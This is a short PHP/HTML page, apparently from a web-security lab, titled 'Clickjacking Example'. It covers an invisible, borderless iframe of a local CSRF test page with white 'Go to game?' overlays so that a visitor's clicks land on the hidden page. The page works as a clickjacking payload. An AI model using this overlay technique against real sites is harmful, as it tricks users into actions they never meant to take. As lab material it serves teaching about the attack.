<?php

/*
* 
* 
*/

require_once "common.php";


?>

<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Clickjacking Example</title>
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/main.css">

	<script type="text/javascript" src="js/jquery.min.js"></script>

	<script type="text/javascript">
	</script>
</head>

<body>

<h1>http://sig.yclim.com</h1>
<h2>Clickjacking</h2>

<div style="width:400px;height:220px;position:fixed;left:400;top:300;z-index:99;background-color:white;"><h2>Go to game?</h2></div>
<div style="width:138px;height:400px;position:fixed;left:400;top:430;z-index:98;background-color:white"></div>

<div>
<iframe style="width:400px;height:300px;overflow:hidden;" id="box" frameBorder="0" scrolling="no" src="http://localhost:2080/secure/csrf.php"></iframe>
</div>


</body>
</html>